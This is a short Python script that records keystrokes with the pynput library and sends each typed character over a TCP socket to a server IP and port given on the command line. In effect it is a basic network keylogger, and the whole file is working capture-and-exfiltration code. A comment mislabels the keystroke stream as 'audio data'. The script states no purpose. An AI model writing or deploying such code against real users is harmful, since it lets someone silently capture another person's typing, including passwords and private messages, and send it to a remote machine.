import argparse
import sys
import os
import socket
from pynput import keyboard


client = 0

def on_press(key):
    try:
        send(key.char)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Send audio data over socket
def send(data):
    client.sendall(data.encode())

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", type=str, default="localhost",
                        help="Server IP")
    parser.add_argument("--port", type=int, default=3366,
                        help="Server port")
    
    args = parser.parse_args()
    HOST = args.ip
    PORT = args.port

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    print("Connected to " + HOST + " at port " + str(PORT))

    
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()